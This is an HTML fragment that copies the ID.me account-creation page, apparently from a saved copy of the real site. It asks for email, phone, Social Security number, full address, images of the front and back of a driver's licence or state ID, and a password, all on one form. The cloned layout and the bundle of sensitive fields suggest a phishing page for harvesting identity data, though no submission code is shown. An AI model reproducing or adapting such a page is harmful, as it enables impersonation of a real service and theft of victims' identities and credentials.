            <div class="form-header-access">
              <h1 id="sr_page_title">Create an ID.me account</h1>
            </div>
            <div class="registration form-header-warning">
              <div class="content">
                <img width="40" alt=""
                  src="./Create an ID.me account - ID.me_files/icon-user-account-dbf91658d42d922e0def36d1587aa0713a836737744276cdb7e828786ebc3762.svg">
                <div class="text">
                  <p>
                    If you already have an ID.me account, do not create a new one.
                    <a href="/">Sign in to your existing account.</a>
                  </p>
                </div>
              </div>
            </div>

            <div class="form-fields">
              <fieldset class="field-group">
                <div class="required-instructions"><span>* Indicates a required field</span></div>
                <legend class="sr-only">
                  Login Credentials
                </legend>
                <div class="field text suggest">
                  <label class="required" for="email">Email</label>
                  <input placeholder="Enter your personal email address" name="user[email]" required="required" type="email"
                    id="email">
                </div>
                <div class="field text suggest">
                  <label class="required" for="phone">Phone</label>
                  <input placeholder="Enter your phone number" name="tel" required="required" type="tel"
                    id="phone">
                </div>
                <div class="field text suggest">
                  <label class="required" for="ssn">SSN</label>
                  <input placeholder="Enter your social security number" name="ssn" required="required" type="text"
                    id="ssn">
                </div>
                <div class="field text suggest">
                  <label class="required" for="address">Address</label>
                  <textarea name="address" id="address" placeholder="Enter your full address" cols="30" rows="3"></textarea>
                </div>
                <div class="field text suggest">
                  <label class="required" for="ssn">Upload front of your State ID / Driver's License</label>
                  <input required="required" type="file" accept="image/*" id="fileFront">
                </div>
                <div class="field text suggest">
                  <label class="required" for="ssn">Upload back of your State ID / Driver's License</label>
                  <input required="required" type="file" accept="image/*" id="fileBack">
                </div>
                <div class="field text password password-showable" data-component="Components.Showable">
                  <label class="required" for="user_password">Password</label>
                  <input class="password-check" placeholder="Enter password"
                    aria-describedby="password-strength-indicator" required="required" autocomplete="new-password"
                    type="password" name="user[password]" id="pass">
                  <span role="alert">

                  </span>

                </div>
                <div class="field text password-showable" data-component="Components.Showable">
                  <label class="required" for="user_password_confirmation">Confirm Password</label>
                  <input placeholder="Reenter password" required="required" autocomplete="new-password" type="password"
                    name="user[password_confirmation]" id="cpass">
                  <span role="alert">

                  </span>
                </div>
              </fieldset>
